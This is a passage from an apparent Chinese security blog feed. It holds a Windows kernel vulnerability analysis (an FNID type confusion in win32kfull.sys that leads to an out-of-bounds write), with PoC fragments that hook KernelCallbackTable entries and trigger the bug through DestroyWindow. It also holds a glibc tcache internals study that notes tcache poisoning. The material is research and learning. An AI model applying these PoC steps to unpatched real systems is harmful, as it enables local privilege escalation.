&amp;OldProtect);</span><br><span class="line"></span><br><span class="line">	*(ULONG64*)((ULONG64)CallbackTable + <span class="number">0x08</span> * <span class="number">0x02</span>) = (ULONG64)fnDWORDHook;</span><br><span class="line"></span><br><span class="line">	*(ULONG64*)((ULONG64)CallbackTable + <span class="number">0x08</span> * <span class="number">0x7C</span>) = (ULONG64)xxxClientFreeWindowClassExtraBytesHook;</span><br><span class="line"></span><br><span class="line">	VirtualProtect(CallbackTable, <span class="number">0x1000</span>, OldProtect, &amp;OldProtect);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>设置窗口对象的的 FNID 值为 0x2a4(dialog)，该值标识了窗口的状态和类型，这里强行设置了该标识导致类型混淆，之后销毁窗口，触发hook掉的<code>xxxClientFreeWindowClassExtraBytesHook</code>函数从而调用<code>SetDialogPointer</code>函数触发漏洞</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pfnNtUserSetWindowFNID(g_hWnd, <span class="number">0x2A4</span>);</span><br><span class="line"></span><br><span class="line">DestroyWindow(g_hWnd);</span><br></pre></td></tr></table></figure>

<h2 id="三、漏洞分析"><a href="#三、漏洞分析" class="headerlink" title="三、漏洞分析"></a>三、漏洞分析</h2><h3 id="1-基本信息"><a href="#1-基本信息" class="headerlink" title="1. 基本信息"></a>1. 基本信息</h3><ul>
<li><p>漏洞文件：win32kfull.sys</p>
</li>
<li><p>漏洞函数：</p>
<p>win32kfull!NtUserSetWindowFNID 函数检查不严谨</p>
</li>
<li><p>漏洞对象：tagWND</p>
</li>
</ul>
<h3 id="2-背景知识"><a href="#2-背景知识" class="headerlink" title="2. 背景知识"></a>2. 背景知识</h3><p>tagWND 有个 FNID 字段标识了窗口的类型和状态，还有个额外内存空间。</p>
<h3 id="3-详细分析"><a href="#3-详细分析" class="headerlink" title="3. 详细分析"></a>3. 详细分析</h3><h4 id="1-基础分析"><a href="#1-基础分析" class="headerlink" title="1. 基础分析"></a>1. 基础分析</h4><p>poc 所描述的问题是“pwnd”变量已传递给 SetDialogPointer 函数，并且不安全地转换为 PDIALOG，但没有正确的结构。 然后写入 pdlg 成员，越界写入 8 个字节，<strong>但我觉得不大对劲，虽然存在类型混淆没有正确结构的问题，但这里因为对齐的原因，pdlg 处分配的内存是比需要的要多 8 字节的，所以不存在越界，暂且当作越界了分析，若有师傅知道问题所在还望指点。</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">SetDialogPointer</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">     PWND pwnd,</span></span></span><br><span class="line"><span class="function"><span class="params">     LONG_PTR lPtr)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     PDIALOG pdialog;</span><br><span class="line">...</span><br><span class="line">     pdialog = UNSAFE_CAST_FNID_ZERO(PDIALOG)(pwnd);</span><br><span class="line"> </span><br><span class="line">     <span class="keyword">if</span> (pdialog) &#123;</span><br><span class="line">         __try &#123;</span><br><span class="line">             pdialog-&gt;pdlg = (PDLG)lPtr;</span><br><span class="line">         &#125;__except (W32ExceptionHandler(FALSE, RIP_WARNING)) &#123;</span><br><span class="line">         &#125;</span><br><span class="line"> ...</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-静态分析"><a href="#2-静态分析" class="headerlink" title="2. 静态分析"></a>2. 静态分析</h4><h5 id="1-函数调用链"><a href="#1-函数调用链" class="headerlink" title="1. 函数调用链"></a>1. 函数调用链</h5><p>带额外内存的窗口创建：</p>
<p><img src="https://z3.ax1x.com/2021/09/29/4hqzFg.png"></p>
<p>设置 FNID：</p>
<p>NtUserSetWindowFNID -&gt; win32u!NtUserSetWindowFNID -&gt; win32kfull!NtUserSetWindowFNID</p>
<p>触发：</p>
<p>DestroyWindow -&gt; USER32!NtUserDestroyWindow -&gt; win32kfull!NtUserDestroyWindow<br>调用 hook 的回调函数<code>xxxClientFreeWindowClassExtraBytesHook</code>-&gt; win32u!NtUserCallHwndParam -&gt; win32kfull!NtUserCallHwndParam -&gt; win32kfull!SetDialogPointer</p>
<h5 id="2-补丁Diff"><a href="#2-补丁Diff" class="headerlink" title="2. 补丁Diff"></a>2. 补丁Diff</h5><p>补丁在<code>NtUserSetWindowFNID</code>中加入了新的对额外内存的检查，来阻止不合法地修改 FNID 的行为：</p>
<p>新版补丁中该补丁位置如下</p>
<p><img src="https://z3.ax1x.com/2021/09/29/4hLMlR.png"></p>
<h5 id="2-漏洞函数分析"><a href="#2-漏洞函数分析" class="headerlink" title="2. 漏洞函数分析"></a>2. 漏洞函数分析</h5><p>win32kfull!NtUserSetWindowFNID 函数检查不完善</p>
<p>该函数经过一些检查后将 tagWND 的 FNID 设置成传入的参数，但其检查并不严格，没有检查额外内存，下图中该偏移处即为 FNID。</p>
<p><img src="https://z3.ax1x.com/2021/09/29/4hLDnP.png"></p>
<p>win32kfull!SetDialogPointer 函数触发越界写</p>
<p><img src="https://z3.ax1x.com/2021/09/29/4hL6AS.png"></p>
<p>该函数把 tagWND 不安全地转换成 PDIALOG，却没有 dialog 的结构，之后把传入参数 a2 写入到 dialog+8 的位置，造成越界。</p>
<p>该转换函数检查了传入指针是否为空，FNID 是否为 dialog，最后返回 *(tagWND+0x118)，经调试得知该处字段只有8字节，值与额外内存的前8字节相同，这个结构有什么意义不清楚。</p>
<p><img src="https://z3.ax1x.com/2021/09/29/4hOM4g.png"></p>
<h4 id="3-动态分析"><a href="#3-动态分析" class="headerlink" title="3. 动态分析"></a>3. 动态分析</h4><p><code>unsafe_cast_fnid_zero_to_PDIALOG</code>转换出的指针指向地址的值是这个</p>
<p><img src="https://z3.ax1x.com/2021/09/29/4hO48H.png"></p>
<p>这里该值是窗口的句柄，经调试得知该值其实是 poc 中</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">SetWindowLongA(g_hWnd, <span class="number">0</span>, (ULONG)g_hWnd);</span><br></pre></td></tr></table></figure>

<p>设置的，将句柄写入额外内存，4字节，偏移为0，将偏移改为4，值改为0xaaaaaaaa后此处的值也随之改变。</p>
<p><img src="https://z3.ax1x.com/2021/09/29/4hOx2j.png"></p>
<p>但再增加偏移位数该值就不会写入到该位置</p>
<p><img src="https://z3.ax1x.com/2021/09/29/4hXEiF.png"></p>
<p>得知该处字段大小为8字节，值为额外内存的前8字节的值。</p>
<p>故<code>unsafe_cast_fnid_zero_to_PDIALOG</code>函数返回一个PDIALOG指向此处，并按照dialog的结构写入数据到+0x8处，发生越界写，而且写入的值是作为参数传入，是可控的。</p>
<p><img src="https://z3.ax1x.com/2021/09/29/4hXKqx.png"></p>
<p>但是该越界写覆盖的是什么数据我不清楚。</p>
<p>另外<code>fnDWORD</code>回调函数会影响可控参数的传入，所以要将其 hook 为空函数，其中缘由我也没有分析清楚。</p>
<h2 id="四、缓解措施"><a href="#四、缓解措施" class="headerlink" title="四、缓解措施"></a>四、缓解措施</h2><p>更新了补丁之后发现传入参数正常却无法正确写入，往上回溯发现是 FNID 没有正常设置，跟进到<code>win32kfull!NtUserSetWindowFNID</code>中发现被这个检查拦住了</p>
<p><img src="https://z3.ax1x.com/2021/09/29/4hX8iD.png"></p>
<p>ida 静态查看就是前面静态分析图中的部分，对比补丁之前发现这里是多出来的，看函数名猜测是对额外内存相关检测，手动写入FNID 后续过程可以正常执行，于是确定这里是新加的针对此漏洞的补丁。</p>
<h2 id="五、参考文献"><a href="#五、参考文献" class="headerlink" title="五、参考文献"></a>五、参考文献</h2><p>网上各种与之沾边的文献</p>
]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>漏洞分析</tag>
        <tag>Windows内核</tag>
      </tags>
  </entry>
  <entry>
    <title>tcache学习</title>
    <url>/2021/05/13/tcache/</url>
    <content><![CDATA[<h1 id="tcache简介"><a href="#tcache简介" class="headerlink" title="tcache简介"></a>tcache简介</h1><p>tcache 是 glibc 2.26 (ubuntu 17.10) 之后引入的一种技术（see <a href="https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc">commit</a>），目的是提升堆管理的性能。但提升性能的同时舍弃了很多安全检查，也因此有了很多新的利用方式。</p>
<p>glibc用<code>USE_TCACHE</code>条件开启 tcache 机制以及编译相关代码。</p>
<p>示例源码均来自glibc2.26,基本都是在<code>glibc-2.26/malloc/malloc.c</code>中</p>
<h1 id="相关数据结构"><a href="#相关数据结构" class="headerlink" title="相关数据结构"></a>相关数据结构</h1><h2 id="宏定义"><a href="#宏定义" class="headerlink" title="宏定义"></a>宏定义</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line"><span class="comment">/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TCACHE_MAX_BINS		64</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> MAX_TCACHE_SIZE	tidx2usize (TCACHE_MAX_BINS-1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Only used to pre-fill the tunables.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> tidx2usize(idx)	(((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* When &quot;x&quot; is from chunksize().  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span></span><br><span class="line"><span class="comment">/* When &quot;x&quot; is a user-provided size.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> usize2tidx(x) csize2tidx (request2size (x))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* With rounding and alignment, the bins are...</span></span><br><span class="line"><span class="comment">   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)</span></span><br><span class="line"><span class="comment">   idx 1   bytes 25..40 or 13..20</span></span><br><span class="line"><span class="comment">   idx 2   bytes 41..56 or 21..28</span></span><br><span class="line"><span class="comment">   etc.  */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* This is another arbitrary limit, which tunables can change.  Each</span></span><br><span class="line"><span class="comment">   tcache bin will hold at most this number of chunks.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TCACHE_FILL_COUNT 7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  REALLOC_ZERO_BYTES_FREES should be set if a call to</span></span><br><span class="line"><span class="comment">  realloc with zero bytes should be the same as a call to free.</span></span><br><span class="line"><span class="comment">  This is required by the C standard. Otherwise, since this malloc</span></span><br><span class="line"><span class="comment">  returns a unique pointer for malloc(0), so does realloc(p, 0).</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> REALLOC_ZERO_BYTES_FREES</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REALLOC_ZERO_BYTES_FREES 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p><code>TCACHE_MAX_BINS</code>是最大条目数，每个条目将尺寸相同的 tcache chunk 连接成一个单向链表，FILO，默认为64；</p>
<p><code>MAX_TCACHE_SIZE</code>是 tcache chunk 的最大尺寸，chunk 的大小在 64 位机器上以 16 字节递增，从 24 到 1032 字节。32 位机器上则是以 8 字节递增，从 12 到 512 字节。所以 tcache bin 只用于存放 non-large 的 chunk；</p>
<p><code>tidx2usize(idx)</code>用于计算tcache chunk size，传入下标idx，返回size；</p>
<p><code>csize2tidx(x)</code>用于将chuncksize转化成idx；</p>
<p><code>usize2tidx(x)</code>用于将提供给用户的size转化成idx；</p>
<p><code>TCACHE_FILL_COUNT</code>表示每条链表的最大长度，默认为7</p>
<h2 id="结构体tcache-entry和tcache-perthread-struct"><a href="#结构体tcache-entry和tcache-perthread-struct" class="headerlink" title="结构体tcache_entry和tcache_perthread_struct"></a>结构体tcache_entry和tcache_perthread_struct</h2><p>tcache 引入了两个新的数据结构<code>tcache_entry</code>和<code>tcache_perthread_struct</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> __thread <span class="keyword">char</span> tcache_shutting_down = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>

<p><code>tcache_entry</code>就是tcache链表的节点，<code>tcache_perthread_struct</code>中包含一个指针数组<code>entrys[TCACHE_MAX_BINS]</code>，用于存放(默认)64个 tcache bins 链表头的地址，还有一个<code>counts[TCACHE_MAX_BINS]</code>数组用于存放每条链表的长度，因为最长为7，所以用 char 类型足够。</p>
<p>需要注意的是和其他 bins 不同，<code>tcache_entry</code>的 next 指针在<code>tcache_entry</code>结构体的开始，而其他 bins 中类似功能的 fd 指针的位置在<code>chunk+0x10</code>的位置(64bit)。</p>
<p>静态变量<code>tcache_shutting_down</code>初始化为0表示tcache没有关闭，默认开启；</p>
<p>静态变量<code>tcache</code>初始化为NULL，一开始 tcache 没有初始化，在第一次 malloc 初始化堆时才初始化 tcache 并赋值到此处。</p>
<h1 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h1><h2 id="tcache-init"><a href="#tcache-init" class="headerlink" title="tcache_init"></a>tcache_init</h2><p>tcache 初始化函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">tcache_init(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="keyword">void</span> *victim = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">size_t</span> bytes = <span class="keyword">sizeof</span> (tcache_perthread_struct); <span class="comment">//获取结构体ize以便后来malloc</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (tcache_shutting_down) <span class="comment">//是否关闭tcache</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes); <span class="comment">//获取分配区</span></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes); <span class="comment">//申请内存</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>) <span class="comment">//失败则重试</span></span><br><span class="line">    &#123;</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>) <span class="comment">//分配区解锁</span></span><br><span class="line">    __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In a low memory situation, we may not be able to allocate memory</span></span><br><span class="line"><span class="comment">     - in which case, we just keep trying later.  However, we</span></span><br><span class="line"><span class="comment">     typically do this very early, so either there is sufficient</span></span><br><span class="line"><span class="comment">     memory, or there isn&#x27;t enough memory to do non-trivial</span></span><br><span class="line"><span class="comment">     allocations anyway.  */</span></span><br><span class="line">  <span class="keyword">if</span> (victim)</span><br><span class="line">    &#123;</span><br><span class="line">      tcache = (tcache_perthread_struct *) victim; <span class="comment">//赋值给静态变量victim</span></span><br><span class="line">      <span class="built_in">memset</span> (tcache, <span class="number">0</span>, <span class="keyword">sizeof</span> (tcache_perthread_struct)); <span class="comment">//清零</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//将tcache_init函数宏定义为 MAY_INIT_TCACHE()</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAYBE_INIT_TCACHE() \</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (tcache == <span class="literal">NULL</span>)) \ <span class="comment">//只有tcache还为NULL时才init</span></span><br><span class="line">    tcache_init();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAYBE_INIT_TCACHE()</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>可以看出 tcache 是存在于堆中的一块大 chunk，执行初始化函数时之前置NULL的静态变量<code>tcache</code>被赋值成这里 malloc 出来的大 chunk，在64位机器中 tcache size 一般为<code>0x291</code>。</p>
<p><code>MAYBE_INIT_TCACHE</code>在<code>__libc_malloc</code>中被调用：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tbytes = request2size (bytes);</span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (tbytes);</span><br><span class="line"></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>每次malloc都会执行<code>MAYBE_INIT_TCACHE</code>，但是因为里面的判断，只有第一次才会执行<code>tcache_init</code></p>
<h2 id="tcache-put"><a href="#tcache-put" class="headerlink" title="tcache_put"></a>tcache_put</h2><p>将 free 的 chunk 按照 size 加入到特定的 tcache bin 中</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk); <span class="comment">//tcache_entry指针指向chunk数据部分</span></span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS); <span class="comment">//断言idx小于最大条目数</span></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx]; </span><br><span class="line">  tcache-&gt;entries[tc_idx] = e; 		<span class="comment">//插入到link头部</span></span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]); <span class="comment">//对应idx的count++</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>没有消除下一个 chunk 的 P 位</p>
<ul>
<li><p><code>tcache_put</code>会在<code>_int_free</code>中被调用</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (size); <span class="comment">//获取idx</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (tcache  <span class="comment">//判断tcache是否初始化</span></span><br><span class="line">	&amp;&amp; tc_idx &lt; mp_.tcache_bins <span class="comment">//判断尺寸</span></span><br><span class="line">	&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) <span class="comment">//判断tcache bin是否装满</span></span><br><span class="line">      &#123;</span><br><span class="line">	tcache_put (p, tc_idx);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>仅判断如果长度在范围内且对应 tcache bin 未满，就执行<code>tcache_put</code>将 free 的 chunk 加入该链表。</p>
</li>
<li><p><code>_int_malloc</code>中如果从 fastbin 中成功返回了一个需要的 chunk，那么对应 fastbin 中的其他 chunk 会被放进相应的 tcache bin 中，直到上限。需要注意的是两者都是 FIFO 策略，所以 chunks 在 tcache bin 的顺序和在 fastbin 中的顺序是反过来的。</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">	  <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">	     stash them in the tcache.  */</span></span><br><span class="line">	  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">	  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) <span class="comment">//判断tcache是否初始化以及尺寸</span></span><br><span class="line">	    &#123;</span><br><span class="line">	      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">	      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">	      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">		     &amp;&amp; (pp = *fb) != <span class="literal">NULL</span>) <span class="comment">//判断tcache bin未满且fast bin不空</span></span><br><span class="line">		&#123;</span><br><span class="line">		  REMOVE_FB (fb, tc_victim, pp); <span class="comment">//取出fastbin头</span></span><br><span class="line">		  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">		    &#123;</span><br><span class="line">		      tcache_put (tc_victim, tc_idx); <span class="comment">//放入tcache bin</span></span><br><span class="line">	            &#125;</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure></li>
<li><p>smallbin 与 fastbin 类似，从中返回 chunk 时会把剩余 chunk 加入到 tcache bin 中直到上限</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">	  <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">	     stash them in the tcache.  */</span></span><br><span class="line">	  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">	  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">	    &#123;</span><br><span class="line">	      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">	      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">	      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">		     &amp;&amp; (tc_victim = last (bin)) != bin) <span class="comment">//判断smallbin不空</span></span><br><span class="line">		&#123;</span><br><span class="line">		  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">		    &#123;</span><br><span class="line">		      bck = tc_victim-&gt;bk;</span><br><span class="line">		      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">		      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">			set_non_main_arena (tc_victim);  <span class="comment">//取出smallbin尾</span></span><br><span class="line">		      bin-&gt;bk = bck;</span><br><span class="line">		      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">		      tcache_put (tc_victim, tc_idx);  <span class="comment">//加入tcache bin头</span></span><br><span class="line">	            &#125;</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure></li>
<li><p>当fastbins和smallbins都不能满足条件就会在unsortedbins中寻找，在unsortedbin bin链上寻找时，每一个符合要求的 chunk 都会优先被放入 tcache，而不是直接返回（除非tcache被装满）。寻找结束后，tcache 会返回其中一个。</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">	      <span class="comment">/* Fill cache first, return to user only if cache fills.</span></span><br><span class="line"><span class="comment">		 We may return one of these chunks later.  */</span></span><br><span class="line">	      <span class="keyword">if</span> (tcache_nb</span><br><span class="line">		  &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">		&#123;</span><br><span class="line">		  tcache_put (victim, tc_idx);</span><br><span class="line">		  return_cached = <span class="number">1</span>;</span><br><span class="line">		  <span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	      <span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="tcache-get"><a href="#tcache-get" class="headerlink" title="tcache_get"></a>tcache_get</h2><p>从指定 idx 的 tcache bin 头部取出一个 chunk</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *</span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx]; <span class="comment">//获得指定idx的tcache bin头部的一个chunk</span></span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS); <span class="comment">//断言idx小于最大条目数</span></span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>); <span class="comment">//断言头节点&gt;0</span></span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next; <span class="comment">//entries[idx]指向第二个chunk，使其成为新的头节点</span></span><br><span class="line">  --(tcache-&gt;counts[tc_idx]); <span class="comment">//对应idx的count--</span></span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>tcache_get</code>会在<code>__libc_malloc</code>调用<code>_int_malloc</code>之前被调用(在之前展示过的初始化之后)，所以malloc 时时若条件满足会优先从tcache中返回一个chunk。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tbytes = request2size (bytes);</span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (tbytes);</span><br><span class="line"></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins <span class="comment">//尺寸</span></span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache <span class="comment">//初始化</span></span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>) <span class="comment">//链表头非空</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>此处仅仅检查了<code>tcache-&gt;entries[tc_idx] != NULL</code>，可能存在 uaf 或者堆溢出漏洞可以设置处于 tcache bin 中 chunk 的数据来实现任意位置 malloc ，这周攻击方式叫 tcache poisoning。</p>
</li>
